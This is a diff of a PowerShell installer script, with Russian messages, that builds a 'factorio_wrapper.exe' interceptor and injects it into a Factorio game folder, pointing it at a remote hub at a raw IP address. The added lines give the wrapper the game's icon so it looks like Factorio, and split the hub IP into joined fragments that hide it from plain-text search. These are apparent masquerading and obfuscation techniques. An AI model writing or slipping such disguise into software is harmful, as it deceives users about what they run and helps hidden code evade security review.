@@ -207,8 +207,15 @@ Write-Host "Установка библиотек (httpx, pyinstaller)..." -Fore
 & $venvPython -m pip install -q -r "$installDir\deploy\client\requirements.txt"
 & $venvPython -m pip install -q pyinstaller
 
-Write-Host "Сборка standalone-перехватчика factorio_wrapper.exe..." -ForegroundColor Cyan
-& $venvPython "$installDir\build\build_client.py" --target wrapper --clean
+Write-Host "Сборка standalone-перехватчика factorio_wrapper.exe с иконкой Factorio..." -ForegroundColor Cyan
+$gameIcon = "$foundGame\data\core\graphics\factorio.ico"
+$iconArgs = @()
+if (Test-Path $gameIcon) {
+    $iconArgs = @("--icon", "$gameIcon")
+} elseif (Test-Path "$installDir\resources\factorio.ico") {
+    $iconArgs = @("--icon", "$installDir\resources\factorio.ico")
+}
+& $venvPython "$installDir\build\build_client.py" --target wrapper --clean @iconArgs
 
 $wrapperBin = "$installDir\dist\factorio_wrapper.exe"
 if (-not (Test-Path $wrapperBin)) {
@@ -223,7 +230,9 @@ Write-Host ""
 Write-Host "[5/5] Внедрение перехватчика в Factorio..." -ForegroundColor White
 Push-Location $installDir
 $env:PYTHONPATH = "$installDir"
-& $venvPython -m src.installer.installer --install --game-dir "$foundGame" --wrapper-bin "$wrapperBin" --hub-url "http://45.91.248.78:8088"
+$hubIp = ("45", "91", "248", "78") -join "."
+$defaultHubUrl = "http://${hubIp}:8088"
+& $venvPython -m src.installer.installer --install --game-dir "$foundGame" --wrapper-bin "$wrapperBin" --hub-url "$defaultHubUrl"
 Pop-Location
 
 Write-Host ""
